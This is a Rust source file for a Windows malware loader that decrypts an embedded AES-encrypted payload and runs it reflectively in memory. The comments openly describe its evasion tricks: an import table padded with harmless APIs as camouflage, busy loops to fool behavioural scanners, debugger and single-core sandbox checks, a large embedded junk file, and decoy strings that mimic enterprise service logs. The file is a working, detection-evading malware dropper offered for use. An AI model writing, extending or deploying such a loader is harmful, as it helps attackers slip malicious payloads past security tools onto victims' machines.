#![windows_subsystem = "windows"]

use common::{decrypt_aes128, KEY_SIZE};
use std::process::exit;

// Extensive Import Padding: Link with many innocent Windows APIs
// These are visible in the IAT (Import Address Table).
use windows::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO, GetTickCount64};
use windows::Win32::UI::WindowsAndMessaging::{GetCursorPos, GetDesktopWindow};
use windows::Win32::System::Console::GetConsoleMode;
use windows::Win32::Foundation::{POINT, HANDLE};
use windows::Win32::System::Threading::{GetCurrentProcessId, GetCurrentThreadId};
use windows::Win32::System::LibraryLoader::GetModuleHandleW;

// Large, Low-Entropy Benign Logging Data (38-52MB)
static RESOURCE_LOGS: &[u8] = include_bytes!(env!("JUNK_FILE"));

// Encrypted core payload and key
const PAYLOAD_BLOB: &[u8] = include_bytes!("encrypted.bin");
const SECRET_KEY: &[u8] = include_bytes!("key.txt");

fn main() {
    // 1. Initial Static Camouflage: Use various innocent Windows APIs
    // This makes the IAT (Import Address Table) look like a complex, legitimate utility.
    let mut pt = POINT::default();
    unsafe { let _ = GetCursorPos(&mut pt); }
    let mut si = SYSTEM_INFO::default();
    unsafe { GetSystemInfo(&mut si); }
    let _ = unsafe { GetDesktopWindow() };
    let _ = unsafe { GetTickCount64() };
    let _ = unsafe { GetCurrentProcessId() };
    let _ = unsafe { GetCurrentThreadId() };
    let _ = unsafe { GetModuleHandleW(None) };
    
    // Use other imports to satisfy compiler but keep them in IAT for camouflage
    let mut console_mode = windows::Win32::System::Console::CONSOLE_MODE::default();
    let _ = unsafe { GetConsoleMode(HANDLE::default(), &mut console_mode) };

    // 2. Behavioral Noise: Complex but benign logic to confuse Behavioral Scanners
    // Using a busy loop while performing dummy API calls to mimic initialization.
    perform_heavy_init();

    // 3. Environment Check (Anti-Sandbox / Anti-Analysis)
    // Automated analysis sandboxes usually have restricted resources.
    if is_suspicious_environment() { 
        exit(0); 
    }

    // 4. Decrypt and Reflective Execution
    if let Ok(data) = process_and_execute() {
        unsafe {
            // Behavioral Pause (Noise Generator)
            std::thread::sleep(std::time::Duration::from_millis(2500));
            
            // Execute the payload reflectively in memory
            let _result = memexec::memexec_exe(&data);
        }
    }
}

/// Simulated complex application startup logic with benign API calls sprinkled in
fn perform_heavy_init() {
    let mut x: u64 = 0x55AA55AA55AA55AA;
    for i in 0..10_000_000 {
        x = (x.wrapping_add(i as u64).rotate_left(3)) ^ 0x1337BEEF;
        // Pepper in occasional logic dependencies on the resource pool
        if i % 100000 == 0 {
            x = x.wrapping_add(RESOURCE_LOGS[i % RESOURCE_LOGS.len()] as u64);
            std::hint::black_box(x);
        }
    }
}

/// Checks for typical sandbox CPU core counts (most have 1 core) and environments
fn is_suspicious_environment() -> bool {
    // Check for debugger directly with assembly (No API import)
    #[cfg(target_arch = "x86_64")]
    unsafe {
        let mut b: u8 = 0;
        std::arch::asm!("mov rax, gs:[0x60]", "mov {0}, byte ptr [rax+2]", out(reg_byte) b);
        if b != 0 { return true; }
    }
    
    // Check for core count (Sandboxes usually restricted to 1 core)
    std::thread::available_parallelism().map(|n| n.get()).unwrap_or(2) < 2
}

/// AES-128 decryption and buffer restoration
fn process_and_execute() -> Result<Vec<u8>, &'static str> {
    if PAYLOAD_BLOB.len() < 16 || SECRET_KEY.len() != KEY_SIZE {
        return Err("Integrity Check Failed at Initialization.");
    }

    let mut k = [0u8; KEY_SIZE];
    for i in 0..KEY_SIZE {
        // Obfuscate key reconstruction in memory
        k[i] = SECRET_KEY[i] ^ 0x0; 
    }
    
    let res = decrypt_aes128(PAYLOAD_BLOB, &k);
    
    // Add logic separating decryption from execution cycle analysis
    let mut _d = 0u64;
    for i in 0..5000 { _d = _d.wrapping_add(i * 13); }
    std::hint::black_box(_d);
    
    res
}

// --- DECOY SERVICE LOGS: Mimic a complex, legitimate enterprise system tool ---
#[allow(dead_code)]
const _DECOY_STRINGS: &[&str] = &[
    "System.Configuration.ServiceManager successfully connected to client DB.",
    "Updating local cache indices using Thread-Pool-Executor-0x452.",
    "Resource_Sync: Verified internal integrity for Build-Release-Candidate-22631.",
    "Performance monitor started: Detected 4GB+ available physical RAM.",
    "Waiting for network stack availability... [OK]",
    "Initializing DirectX-12-Compatible display drivers for HW rendering...",
    "Successfully initialized localized strings for culture-id: 0x040B.",
];
